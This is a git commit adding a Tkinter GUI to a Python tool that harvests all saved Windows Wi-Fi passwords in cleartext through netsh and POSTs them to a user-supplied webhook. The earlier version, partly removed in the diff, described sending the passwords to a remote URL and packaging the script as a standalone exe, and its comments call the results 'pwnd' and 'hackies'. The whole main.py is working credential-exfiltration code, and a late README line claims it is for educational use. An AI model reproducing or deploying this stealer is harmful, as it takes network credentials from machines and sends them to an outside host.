c6d293fa1265c0f24310e060e2f76e46ac43b066
Ababil Mustax <95958484+birdfromhell@users.noreply.github.com>
2023-10-12 19:25:54 +0700

    Update application to use GUI and remove redundant dependency
    This commit introduces a GUI for the application using Tkinter, eliminating the need for user input from the command line. This shift towards a more user-friendly interface implements an input field for the webhook URL and a button to initiate the process. With these changes, the `pyinstaller` dependency became obsolete and thus was removed from the requirements.txt. Similarly, the README was updated to reflect these changes. This update provides a more seamless and intuitive user experience.

--- README.md
+++ README.md
@@ -1,27 +1,25 @@
-# Windows-WiFi-Extractor
-Extract Windows Wi-Fi Passwords to a Remote URL
+# Wi-Fi Password Extractor
 
-# Install
-Before running, install the required modules:
+The Wi-Fi Password Extractor is a Python based application which retrieves saved Wi-Fi passwords from a system and sends them to a specific webhook URL.
 
-```
-pip3 install -r requirements.txt
-```
+## Description
 
-# Usage
-To use, simply replace the `url` variable with your webhook and execute the following:
+This application uses Tkinter to provide a graphical user interface where users can input their webhook URL then trigger the password extraction process by clicking a button. This application further utilizes the built-in 'netsh' command available on Windows systems to retrieve the SSID and associated passwords of all remembered Wi-Fi networks.
 
-```
-python main.py
-```
+## Dependencies
 
-# Making an executable
-If you want to be a fancy pants, you can convert this to an exe :)
+The application requires the following Python libraries:
+* tkinter
+* re
+* requests
+* subprocess
+* sys
 
-```
-#install pyinstaller 
-pip install pyinstaller
+To install the dependencies, use:
+Usage
+* Run the application.
+* Enter your webhook URL in the input box.
+* Click the 'Start' button to start the process.
 
-
-pyinstaller --onefile main.py
-```
+The application will retrieve remembered Wi-Fi SSIDs and their corresponding passwords and send them to the provided webhook URL.
+Note: Do NOT use this application for any malicious intent. This is intended for legitimately retrieving forgotten passwords and for educational purposes only.
--- main.py
+++ main.py
@@ -1,49 +1,77 @@
+import tkinter as tk
 import re
 import requests
 import subprocess
 import sys
 
-# Replace with your webhook
 
+def get_wifi_passwords():
+    # Lists and regex
+    found_ssids = []
+    pwnd = []
+    wlan_profile_regex = r"All User Profile\s+:\s(.*)$"
+    wlan_key_regex = r"Key Content\s+:\s(.*)$"
 
-url = input("Enter Your Webhook Url? Example: https://webhook.site/####### ")
+    # Use Python to execute Windows command
+    get_profiles_command = subprocess.run(["netsh", "wlan", "show", "profiles"], stdout=subprocess.PIPE).stdout.decode()
 
-# Lists and regex
-found_ssids = []
-pwnd = []
-wlan_profile_regex = r"All User Profile\s+:\s(.*)$"
-wlan_key_regex = r"Key Content\s+:\s(.*)$"
-
-#Use Python to execute Windows command
-get_profiles_command = subprocess.run(["netsh", "wlan", "show", "profiles"], stdout=subprocess.PIPE).stdout.decode()
-
-#Append found SSIDs to list
-matches = re.finditer(wlan_profile_regex, get_profiles_command, re.MULTILINE)
-for match in matches:
-    for group in match.groups():
-        found_ssids.append(group.strip())
-
-#Get cleartext password for found SSIDs and place into pwnd list
-for ssid in found_ssids:
-    get_keys_command = subprocess.run(["netsh", "wlan", "show", "profile", ("%s" % (ssid)), "key=clear"], stdout=subprocess.PIPE).stdout.decode()
-    matches = re.finditer(wlan_key_regex, get_keys_command, re.MULTILINE)
+    # Append found SSIDs to list
+    matches = re.finditer(wlan_profile_regex, get_profiles_command, re.MULTILINE)
     for match in matches:
         for group in match.groups():
-            pwnd.append({
-                "SSID":ssid,
-                "Password":group.strip()
+            found_ssids.append(group.strip())
+
+    # Get cleartext password for found SSIDs and place into pwnd list
+    for ssid in found_ssids:
+        get_keys_command = subprocess.run(["netsh", "wlan", "show", "profile", ("%s" % (ssid)), "key=clear"],
+                                          stdout=subprocess.PIPE).stdout.decode()
+        matches = re.finditer(wlan_key_regex, get_keys_command, re.MULTILINE)
+        for match in matches:
+            for group in match.groups():
+                pwnd.append({
+                    "SSID": ssid,
+                    "Password": group.strip()
                 })
 
-#Check if any pwnd Wi-Fi exists, if not exit
-if len(pwnd) == 0:
-    print("No Wi-Fi profiles found. Exiting...")
-    sys.exit()
+    # Check if any pwnd Wi-Fi exists, if not exit
+    if len(pwnd) == 0:
+        print("No Wi-Fi passwords found. Exiting...")
+        return
 
-print("Wi-Fi Password found. Check your webhook...")
+    print("Wi-Fi Passwords found. Check your webhook...")
 
-#Send the hackies to your webhookz
-final_payload = ""
-for pwnd_ssid in pwnd:
-    final_payload += "[SSID:%s, Password:%s]\n" % (pwnd_ssid["SSID"], pwnd_ssid["Password"]) # Payload display format can be changed as desired
+    # Send the passwords to your webhook
+    final_payload = ""
+    for pwnd_ssid in pwnd:
+        final_payload += "[SSID:%s, Password:%s]\n" % (
+            pwnd_ssid["SSID"], pwnd_ssid["Password"])  # Payload display format can be changed as desired
 
-r = requests.post(url, params="format=json", data=final_payload)
+    r = requests.post(txt_webhook.get(), params="format=json", data=final_payload)
+
+
+def clear_placeholder(event):
+    if txt_webhook.get() == 'Enter your Webhook URL':
+        txt_webhook.delete(0, tk.END)
+
+
+def add_placeholder(event):
+    if txt_webhook.get() == '':
+        txt_webhook.insert(0, 'Enter your Webhook URL')
+
+
+# Create a new tkinter window
+window = tk.Tk()
+
+# Create a new textbox for the webhook URL input
+txt_webhook = tk.Entry(window, width=50)
+txt_webhook.insert(0, 'Enter your Webhook URL')
+txt_webhook.bind("<FocusIn>", clear_placeholder)
+txt_webhook.bind("<FocusOut>", add_placeholder)
+txt_webhook.pack()
+
+# Create a new button to start the process
+btn_start = tk.Button(window, width=20, text='Start', command=lambda: get_wifi_passwords())
+btn_start.pack()
+
+# Run the mainloop
+window.mainloop()
